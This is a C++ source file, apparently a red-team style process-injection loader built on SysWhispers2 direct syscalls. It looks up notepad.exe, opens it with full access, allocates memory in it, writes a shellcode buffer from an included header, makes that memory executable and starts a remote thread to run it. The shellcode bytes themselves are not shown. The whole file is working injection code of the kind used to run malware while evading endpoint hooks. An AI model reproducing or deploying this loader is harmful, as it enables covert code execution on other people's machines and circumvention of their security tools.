// SysWhispers2 
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#include "syscalls/syscalls.h"
#include "ntstatus.h"
#include "shellcode.h"

using namespace std;

DWORD GetProcessId(wstring ProcessName) {
    
    PROCESSENTRY32W PE32 = {};
    PE32.dwSize = sizeof PROCESSENTRY32W;

    HANDLE hSnapshot; 
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {

        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD ProcessId = 0;

    if (Process32FirstW(hSnapshot, &PE32)) {
        
        do {
            if (ProcessName.compare(PE32.szExeFile) == 0) {
                ProcessId = PE32.th32ProcessID;
            }

        } while (Process32NextW(hSnapshot, &PE32));
    }
    else {
        CloseHandle(hSnapshot);
        return 0;
    }
    
        
    CloseHandle(hSnapshot);
    PE32.dwFlags = 0;

    return ProcessId;
}

int main()
{
    OBJECT_ATTRIBUTES OA{};
    CLIENT_ID CI{};

    PVOID BaseAddress = NULL;
    SIZE_T RegionSize = (SIZE_T)(sizeof(shellcode));

    SIZE_T BytesWritten = 0;
    ULONG OldProtect = 0;

    //NTSTATUS status = STATUS_SUCCESS;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    NTSTATUS status = NULL;

    PS_ATTRIBUTE_LIST PSAL{};

    DWORD ProcessId = GetProcessId(L"notepad.exe");
    if (ProcessId != 0) {
        CI.UniqueProcess = (HANDLE)ProcessId;
    }
    else {
        return -1;
    }

    cout << "[+] Process Id: " << ProcessId << endl;

    status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CI);
    if (status != STATUS_SUCCESS) return 1;
    
    if (hProcess == NULL) return 1;
    cout << "[+] Handle: " << hProcess << endl;

    status = NtAllocateVirtualMemory(hProcess, &BaseAddress, 0, &RegionSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
        cout << "Last Error 1: " << GetLastError() << endl;
        return 1;
    }

    cout << "[+] Address: " << BaseAddress << endl;

    //cout << "[+] Shellcode: " << (void*)&shellcode << endl;

    status = NtWriteVirtualMemory(hProcess, BaseAddress, (void*)&shellcode, RegionSize, &BytesWritten);
    if (status != STATUS_SUCCESS) {
        cout << "Last Error 2: " << GetLastError() << endl;
        return 1;
    }

    status = NtProtectVirtualMemory(hProcess, &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &OldProtect);
    if (status != STATUS_SUCCESS) {
        cout << "Last Error 3: " << GetLastError() << endl;
        return 1;
    }

    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, BaseAddress, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        cout << "Last Error 4: " << GetLastError() << endl;
        return 1;
    }
}
